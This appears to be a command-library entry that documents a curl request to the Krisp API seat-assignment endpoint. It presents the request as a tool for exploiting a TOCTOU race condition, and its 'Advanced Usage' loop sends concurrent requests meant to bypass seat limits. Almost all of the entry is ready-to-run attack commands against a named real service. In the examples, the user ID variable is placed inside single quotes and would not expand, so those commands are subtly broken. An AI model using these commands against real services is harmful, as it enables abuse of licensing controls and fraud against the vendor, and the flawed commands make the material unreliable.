---
data: >-
  curl -X POST https://api.krisp.ai/v2/seats -H "Authorization: Bearer $TOKEN"
  -H "Content-Type: application/json" -d '{"action": "assign", "user_id":
  "target_user_id"}'
tags:
  - api
  - exploit
  - race-condition
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 7e2fb099-820c-4740-86e5-87c54a08efc2
created_at: '2025-12-14T17:24:22.263Z'
updated_at: '2025-12-14T17:24:22.263Z'
verified: false
validated: true
submitted: true
---
# curl-assign-seat

## Command

```bash
curl -X POST https://api.krisp.ai/v2/seats -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"action": "assign", "user_id": "target_user_id"}'
```

## Description

This command sends a POST request to the Krisp API /v2/seats endpoint to assign a seat to a specified user, used in exploiting the TOCTOU race condition by running multiple instances concurrently.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-H "Authorization: Bearer $TOKEN"` | Provides the API authentication token | Yes |
| `-H "Content-Type: application/json"` | Sets the request body content type | Yes |
| `-d '{"action": "assign", "user_id": "target_user_id"}'` | JSON payload for seat assignment | Yes |

## Examples

### Basic Usage

```bash
TOKEN="your_token" USER_ID="user123"
curl -X POST https://api.krisp.ai/v2/seats -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"action": "assign", "user_id": "$USER_ID"}'
```

### Advanced Usage

```bash
# For concurrent execution in a script
for i in {1..5}; do curl -X POST https://api.krisp.ai/v2/seats -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"action": "assign", "user_id": "$USER_ID"}' & done
```

## Expected Output

HTTP 200 OK response with JSON body confirming seat assignment, e.g., {"status": "success", "seat_id": "new_seat_123"}. In a race exploit, multiple such responses indicate bypassed limits.

## Related

- [[Related Procedure: Exploit TOCTOU Race Condition on Krisp Seats Endpoint]]
